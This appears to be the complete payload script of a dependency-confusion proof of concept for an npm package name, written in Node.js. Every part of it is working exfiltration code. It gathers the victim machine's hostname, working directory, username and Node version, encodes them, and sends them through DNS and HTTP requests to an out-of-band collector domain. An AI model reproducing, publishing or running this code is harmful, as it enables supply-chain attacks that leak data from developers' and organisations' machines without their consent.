k#!/usr/bin/env node

const https = require('https');
const http = require('http');
const dns = require('dns');
const os = require('os');
const crypto = require('crypto');

const pkg = '@evoja-web/redaction@99.0.8';
const host = os.hostname();
const cwd = process.cwd();
const user = process.env.USER || process.env.USERNAME || 'unknown';
const node = process.version;
const ts = new Date().toISOString();

console.log('\n=== POC EXECUTED ===');
console.log('Package:', pkg);
console.log('Hostname:', host);
console.log('CWD:', cwd);
console.log('User:', user);
console.log('Node:', node);
console.log('Timestamp:', ts);

const data = {
  package: pkg,
  hostname: host,
  cwd,
  user,
  node,
  ts
};

const json = JSON.stringify(data);
const b64 = Buffer.from(json, 'utf8').toString('base64url');
const id = crypto.randomBytes(4).toString('hex');

const baseDomain = 'd759lt0jeve5711kh3s07pk8pz1cra5tr.oast.fun';
const dnsHost = `${id}.${baseDomain}`;
const httpPath = `/?id=${encodeURIComponent(id)}&host=${encodeURIComponent(host)}&pkg=${encodeURIComponent(pkg)}&d=${b64}`;

console.log('DNS probe:', dnsHost);
console.log('HTTP probe:', `https://${baseDomain}${httpPath}`);

dns.resolve4(dnsHost, (err, addresses) => {
  if (err) {
    console.log('DNS lookup error:', err.code || err.message);
  } else {
    console.log('DNS resolved:', addresses.join(','));
  }
});

https.get(`https://${baseDomain}${httpPath}`, (res) => {
  console.log('HTTPS status:', res.statusCode);
  res.resume();
}).on('error', (e) => {
  console.log('HTTPS error:', e.message);
});

const req = http.request({
  hostname: baseDomain,
  port: 80,
  path: httpPath,
  method: 'GET',
  headers: {
    'User-Agent': 'npm-poc/99.0.8'
  }
}, (res) => {
  console.log('HTTP status:', res.statusCode);
  res.resume();
});

req.on('error', (e) => {
  console.log('HTTP error:', e.message);
});

req.end();
